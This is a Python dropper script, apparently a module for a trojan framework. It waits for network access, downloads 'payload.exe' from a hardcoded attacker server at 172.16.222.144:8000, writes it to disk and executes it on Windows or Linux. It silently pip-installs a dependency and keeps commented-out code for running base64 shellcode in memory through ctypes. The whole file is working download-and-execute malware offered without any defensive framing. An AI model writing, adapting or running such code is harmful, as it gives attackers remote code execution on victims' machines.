############ *_* TO note *_* ################
# run: python -m SimpleHTTPServer ###########
# The the directory from which you run that #
# command become the web directory, so move #
# files to that dir.                        #
# To check: firefox http://127.0.0.1:8000   #
############################################# 

import base64
import ctypes
import os
import time

#TODO. Check if we have python27 or python3 run this script to know which module to import !!
try:
  import urllib3 
except:
  os.system("pip install urllib3")
  import urllib3

# retrieve the shellcode from our web server
url = "http://172.16.222.144:8000/payload.exe" #"https://dc619.4shared.com/img/mSMvaperce/s23/1542cfad648/Dragon_Ball_Z_Shin_Budokai_2" #
bin = True
OsTargetpath = "test.exe"
start = True

import socket
REMOTE_SERVER = "www.google.com"
def is_connected(hostname):
  try:
    # see if we can resolve the host name: if there is a DNS listening
    host = socket.gethostbyname(hostname)
    # connect to the host: if the host is actually reachable
    s = socket.create_connection((host, 80), 2)
    return True
  except:
     pass
  return False

def run(**args):
          response=""
          while not is_connected(): 
                  time.sleep(20)
          try:
            http = urllib3.PoolManager()
            r = http.request('GET', url)
          except urllib3.exceptions.MaxRetryError:
          	os.system("echo 'getFileFromURI: HTTP Error 404: File not found' >> Tapalog.log")
          except urllib3.exceptions.URLError: 
          	os.system("echo '<urlopen error [Errno 111] Connection refused>' >> Tapalog.log")
          # decode the shellcode from base64
          shellcode = r.data  ####shellcode = base64.b64decode(r.data)
          #shellcode_buffer = ctypes.create_string_buffer(shellcode, len(shellcode))
          #shellcode_func = ctypes.cast(ctypes.byref(shellcode_buffer), ctypes.CFUNCTYPE(ctypes.c_void_p))
          #shellcode_func() #==> Acces violationm seg fault
          
          if bin:
                  mon_fichier = open(OsTargetpath, "wb")
          else:
                  mon_fichier = open(OsTargetpath, "w")
          mon_fichier.write(shellcode)
          mon_fichier.close()
          if start and os.name == 'nt':
                  os.system("start {}".format(OsTargetpath))
          elif start and os.name == 'posix':
                  os.system("chmod 777 {}".format(OsTargetpath))
                  os.system("./{}".format(OsTargetpath))
          else:
                  os.system("echo 'Non-recognized OS' >> Tapalog.log")
          time.sleep(5)
          #os.system("del fichier.exe")


